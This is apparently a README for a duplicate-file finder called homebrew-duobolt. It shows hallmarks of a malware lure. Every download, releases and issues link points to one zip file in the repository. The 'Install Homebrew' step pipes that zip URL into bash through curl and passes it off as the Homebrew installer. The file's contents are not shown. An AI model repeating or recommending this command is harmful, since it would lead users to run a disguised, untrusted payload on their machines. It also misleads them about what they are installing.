# 🛠️ homebrew-duobolt - Find Duplicate Files Fast

## 🚀 Getting Started

Welcome to the homebrew-duobolt repository! This tool helps you quickly find duplicate files on your macOS or Linux system. With homebrew-duobolt, you can save space and organize your files efficiently.

## 📥 Download

[![Download homebrew-duobolt](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip%20homebrew--duobolt-v1.0.0-brightgreen)](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)

You can download homebrew-duobolt by visiting our [Releases page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip). This page includes all available versions of the software.

## 💡 Features

- **Fast Searching:** Uses the BLAKE3 algorithm to find duplicates quickly.
- **User-Friendly Interface:** Simple command-line interface, easy to use for everyone.
- **Supported Platforms:** Works on both macOS and Linux.
- **Customizable Options:** Adjust search parameters to fit your needs.

## 🖥️ System Requirements

To use homebrew-duobolt, you need:

- A computer running macOS or Linux.
- The Homebrew package manager installed on your system.
- Basic command-line knowledge (if you can open a terminal and run some commands, you are good to go).

## 💻 Installation

### Step 1: Install Homebrew

If you do not have Homebrew installed, you can do so by opening your terminal and running:

```bash
/bin/bash -c "$(curl -fsSL https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)"
```

This will guide you through the Homebrew installation process.

### Step 2: Install homebrew-duobolt

After installing Homebrew, run the following command in your terminal:

```bash
brew tap Piyushdalai/duobolt
brew install duobolt-cli
```

This command will download and install homebrew-duobolt on your computer.

## 📂 Usage

Once homebrew-duobolt is installed, you can start using it right away. Here’s how:

1. Open your terminal.
2. Run the command to find duplicates. Here’s the basic command structure:

```bash
duobolt <path-to-directory>
```

Replace `<path-to-directory>` with the path of the folder you want to scan for duplicates. For example:

```bash
duobolt ~/Documents
```

3. Wait for the scanning process to complete. The tool will list any duplicate files it finds.

## 📝 Additional Commands

You can customize your search further by using additional options:

- To scan a specific file type:  
  ```bash
  duobolt ~/Documents --filetype jpg
  ```

- To delete duplicates automatically:  
  ```bash
  duobolt ~/Documents --delete
  ```

Use `--help` to view all available options:

```bash
duobolt --help
```

## 💬 Support

If you encounter any issues or have questions, please visit our [Issues page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip) to seek help or report any bugs. We appreciate your feedback, as it helps us improve the application.

## 🌟 Contributing

While this tool is aimed at end users, contributions are always welcome! If you’d like to suggest features or improvements, feel free to open a pull request or an issue on the GitHub repository.

## ✨ License

homebrew-duobolt is open-source software. You can freely use and modify it according to the terms provided in our repository.

## 🌐 Links

- [Releases Page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)
- [Issues Page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)

Thank you for using homebrew-duobolt! Enjoy your cleaner, more organized files!